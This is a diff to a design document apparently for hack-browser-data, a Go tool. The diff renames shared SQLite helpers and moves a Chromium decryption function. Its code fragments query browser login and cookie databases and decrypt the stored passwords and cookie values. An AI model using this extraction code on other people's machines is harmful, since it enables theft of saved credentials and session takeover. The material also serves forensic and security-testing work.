@@ -289,12 +289,12 @@ func platformBrowsers() []Config {
 
 ---
 
-## 3. Shared Helpers: `browserdata/datautil/`
+## 3. Shared Helpers: `utils/sqliteutil/`
 
 ### 3.1 SQLite query helper
 
 ```go
-// browserdata/datautil/sqlite.go
+// utils/sqliteutil/sqlite.go
 
 func QuerySQLite(dbPath string, journalOff bool, query string, scanFn func(*sql.Rows) error) error {
     db, err := sql.Open("sqlite", dbPath)
@@ -322,7 +322,7 @@ func QuerySQLite(dbPath string, journalOff bool, query string, scanFn func(*sql.
 ### 3.2 Generic query helper — `datautil/query.go`
 
 ```go
-package datautil
+package sqliteutil
 
 // queryRows is a generic helper (Go 1.20) that wraps QuerySQLite
 // and collects results into a typed slice. Each extract method
@@ -341,21 +341,7 @@ func QueryRows[T any](path string, journalOff bool, query string, scanRow func(*
 
 ### 3.3 Chromium decrypt helper
 
-```go
-// browserdata/datautil/decrypt.go
-
-func DecryptChromiumValue(masterKey, encrypted []byte) ([]byte, error) {
-    if len(encrypted) == 0 { return nil, nil }
-    if len(masterKey) == 0 {
-        return crypto.DecryptWithDPAPI(encrypted)
-    }
-    value, err := crypto.DecryptWithDPAPI(encrypted)
-    if err != nil {
-        value, err = crypto.DecryptWithChromium(masterKey, encrypted)
-    }
-    return value, err
-}
-```
+Moved to `browser/chromium/decrypt.go` as an unexported function `decryptValue()`. It is Chromium-specific (DPAPI → AES-GCM/CBC fallback) and only used by Chromium extract methods. See RFC-001 for details.
 
 ---
 
@@ -371,7 +357,7 @@ Each extract method lives in its own `extract_*.go` file inside the browser engi
 const defaultLoginQuery = `SELECT origin_url, username_value, password_value, date_created FROM logins`
 
 func (c *Chromium) extractPasswords(masterKey []byte, path string) ([]types.LoginEntry, error) {
-    logins, err := datautil.QueryRows(path, false, c.query(types.Password),
+    logins, err := sqliteutil.QueryRows(path, false, c.query(types.Password),
         func(rows *sql.Rows) (types.LoginEntry, error) {
             var url, username string
             var pwd []byte
@@ -379,7 +365,7 @@ func (c *Chromium) extractPasswords(masterKey []byte, path string) ([]types.Logi
             if err := rows.Scan(&url, &username, &pwd, &created); err != nil {
                 return types.LoginEntry{}, err
             }
-            password, _ := datautil.DecryptChromiumValue(masterKey, pwd)
+            password, _ := decryptValue(masterKey, pwd)
             return types.LoginEntry{
                 URL:       url,
                 Username:  username,
@@ -406,7 +392,7 @@ const defaultCookieQuery = `SELECT name, encrypted_value, host_key, path,
     has_expires, is_persistent FROM cookies`
 
 func (c *Chromium) extractCookies(masterKey []byte, path string) ([]types.CookieEntry, error) {
-    cookies, err := datautil.QueryRows(path, false, c.query(types.Cookie),
+    cookies, err := sqliteutil.QueryRows(path, false, c.query(types.Cookie),
         func(rows *sql.Rows) (types.CookieEntry, error) {
             var (
                 name, host, path                               string
@@ -420,7 +406,7 @@ func (c *Chromium) extractCookies(masterKey []byte, path string) ([]types.Cookie
                 return types.CookieEntry{}, err
             }
 
-            value, _ := datautil.DecryptChromiumValue(masterKey, encryptedValue)
+            value, _ := decryptValue(masterKey, encryptedValue)
             return types.CookieEntry{
                 Name:       name,
                 Host:       host,
@@ -503,7 +489,7 @@ const firefoxCookieQuery = `SELECT name, value, host, path,
     creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
 
 func (f *Firefox) extractCookies(path string) ([]types.CookieEntry, error) {
-    cookies, err := datautil.QueryRows(path, true, firefoxCookieQuery,
+    cookies, err := sqliteutil.QueryRows(path, true, firefoxCookieQuery,
         func(rows *sql.Rows) (types.CookieEntry, error) {
             var (
                 name, value, host, path string
@@ -777,8 +763,8 @@ func formatFilename(browserName, dataName, format string) string {
 1. `types/category.go` — Category enum
 2. `types/models.go` — all *Entry structs
 3. `browserdata/browserdata.go` — BrowserData struct
-4. `browserdata/datautil/sqlite.go` — QuerySQLite()
-5. `browserdata/datautil/decrypt.go` — DecryptChromiumValue()
+4. `utils/sqliteutil/sqlite.go` — QuerySQLite()
+5. `browser/chromium/decrypt.go` — decryptValue() (Chromium-specific, unexported)
 6. `filemanager/session.go` — Session
 
 ### Phase 2: Extract methods (new files, coexist with old code)
@@ -839,5 +825,5 @@ GOOS=darwin GOARCH=amd64 go build ./cmd/hack-browser-data/
 | File source mapping | — | covered |
 | File acquisition | — | covered |
 | Extract methods | — | covered |
-| datautil helpers | — | covered |
+| sqliteutil helpers | — | covered |
 | Output | — | covered |
